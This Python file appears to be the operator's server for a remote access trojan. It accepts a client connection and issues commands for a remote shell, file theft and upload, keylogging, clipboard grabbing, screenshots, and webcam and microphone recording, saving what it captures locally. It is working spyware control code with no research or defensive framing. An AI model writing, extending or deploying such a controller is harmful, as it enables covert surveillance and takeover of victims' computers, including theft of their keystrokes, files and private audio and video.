from socket import socket, AF_INET, SOCK_STREAM, timeout
from os import path
from PIL import Image, ImageFile
from io import BytesIO
from datetime import datetime
from cv2 import VideoWriter, VideoWriter_fourcc, imdecode
from numpy import frombuffer, uint8
from wave import open as waveOpen
from pyaudio import get_sample_size, paInt16
ImageFile.LOAD_TRUNCATED_IMAGES = True
from struct import pack, unpack

def sendMsg(socket, msg):
    msg = pack('>I', len(msg)) + msg
    socket.sendall(msg)

def recvMsg(socket):
    rawMsgLen = recvAll(socket, 4)
    if not rawMsgLen:
        return None
    msgLen = unpack('>I', rawMsgLen)[0]
    return recvAll(socket, msgLen)

def recvAll(socket, bytes):
    data = bytearray()
    while len(data) < bytes:
        packet = socket.recv(bytes - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def CloseConnection(socket):
    main.connection = False
    sendMsg(socket, "Exit".encode())
    socket.close()

def GetSystemInfo(socket):
    sendMsg(socket, "GetSystemInfo".encode())
    sysInfo = recvMsg(socket).decode()
    return sysInfo

def CommandLineInterface(socket):
    commandInterface = True
    sendMsg(socket, "CommandLineInterface".encode())
    while commandInterface:
        command = str(input("CommandLineInterface: "))
        if command == "exit":
            commandInterface = False
            sendMsg(socket, "exit".encode())
            break
        else:
            sendMsg(socket, command.encode())
            result = recvMsg(socket).decode()
            print(result)

def GetFile(socket, command):
    sendMsg(socket, " ".join(command[:2]).encode())
    result = recvMsg(socket).decode()
    if result == "Success":
        file = open(command[2], "wb")
        filesize = int(recvMsg(socket).decode())
        sendMsg(socket, "Success".encode())
        actSize = 0
        while actSize < filesize:
            data = recvMsg(socket)
            sendMsg(socket, "Success".encode())
            actSize += 1024
            file.write(data)
        file.close()
    else:
        print(result)

def SendFile(socket, command):
    if path.exists(command[1]):
        sendMsg(socket, command[0].encode())
        sendMsg(socket, command[2].encode())
        recvMsg(socket)
        filesize = path.getsize(command[1])
        sendMsg(socket, str(filesize).encode())
        recvMsg(socket)
        file = open(command[1], "rb")
        data = file.read(1024)
        while data:
            sendMsg(socket, data)
            recvMsg(socket)
            data = file.read(1024)
        file.close()
    else:
        print("{} doesn\'t exists".format(command[1]))

def CaptureKeyboardInput(socket, command):
    sendMsg(socket, " ".join(command).encode())
    result = recvMsg(socket).decode()
    print(result)

def GetClipboardInfo(socket):
    sendMsg(socket, "GetClipboardInfo".encode())
    result = recvMsg(socket).decode()
    print(result)

def TakeScreenshot(socket):
    sendMsg(socket, "TakeScreenshot".encode())
    bytesScreenshot = recvMsg(socket)
    screenshot = Image.open(BytesIO(bytesScreenshot))
    filestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    screenshot.save("{}.png".format(filestamp))

def RecordVideo(socket, command):
    sendMsg(socket, " ".join(command).encode())
    result = recvMsg(socket).decode()
    if result == "Success":
        filestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        fourcc = VideoWriter_fourcc(*'XVID')
        writer = VideoWriter("{}.avi".format(filestamp), fourcc, 30, (640, 480))
        loopCount = int(recvMsg(socket).decode())
        sendMsg(socket, "Success".encode())
        while loopCount:
            bytesFrame = recvMsg(socket)
            sendMsg(socket, "Success".encode())
            frame = imdecode(frombuffer(bytesFrame, dtype = uint8), 1)
            writer.write(frame)
            loopCount -= 1
        writer.release()
    else:
        print(result)

def RecordAudio(socket, command):
    sendMsg(socket, " ".join(command).encode())
    bytesFrame = b""
    loopCount = int(recvMsg(socket).decode())
    sendMsg(socket, "Success".encode())
    while loopCount:
        bytesFrame += recvMsg(socket)
        sendMsg(socket, "Success".encode())
        loopCount -= 1
    filestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    writer = waveOpen("{}.wav".format(filestamp), "wb")
    writer.setnchannels(2)
    writer.setsampwidth(get_sample_size(paInt16))
    writer.setframerate(44100)
    writer.writeframes(bytesFrame)
    writer.close()

def ProcessCommand(socket):
    command = str(input("Enter the command: ")).split()
    if command[0] == "Exit":
        CloseConnection(socket)
    elif command[0] == "GetSystemInfo":
        sysInfo = GetSystemInfo(socket)
        print(sysInfo)
    elif command[0] == "CommandLineInterface":
        CommandLineInterface(socket)
    elif command[0] == "GetFile":
        if len(command) == 3:
            GetFile(socket, command)
        else:
            print("Syntax error!\nGetFile <FilenameToTransfer> <FilenameToSave>")
    elif command[0] == "SendFile":
        if len(command) == 3:
            SendFile(socket, command)
        else:
            print("Syntax error!\nSendFile <FilenameToTransfer> <FilenameToSave>")
    elif command[0] == "CaptureKeyboardInput":
        if len(command) == 2:
            CaptureKeyboardInput(socket, command)
        else:
            print("Syntax error!\nCaptureKeyboardInput <CaptureTime>(in seconds)")
    elif command[0] == "GetClipboardInfo":
        GetClipboardInfo(socket)
    elif command[0] == "TakeScreenshot":
        TakeScreenshot(socket)
    elif command[0] == "RecordVideo":
        if len(command) == 2:
            RecordVideo(socket, command)
        else:
            print("Syntax error!\nRecordVideo <RecordTime>")
    elif command[0] == "RecordAudio":
        if len(command) == 2:
            RecordAudio(socket, command)
        else:
            print("Syntax error!\nRecordAudio <RecordTime>")
    else:
        print("Unrecognized command\nList of commands: Exit; GetSystemInfo; CommandLineInterface; GetFile; SendFile; CaptureKeyboardInput; GetClipboardInfo; TakeScreenshot; RecordVideo; RecordAudio")

def main():
    HOST = "127.0.0.1"
    PORT = 6060

    sSocket = socket(AF_INET, SOCK_STREAM)
    sSocket.bind((HOST, PORT))
    sSocket.listen()

    conn, addr = sSocket.accept()
    main.connection = True
    print("{} connected!".format(addr))
    while main.connection:
        ProcessCommand(conn)

main()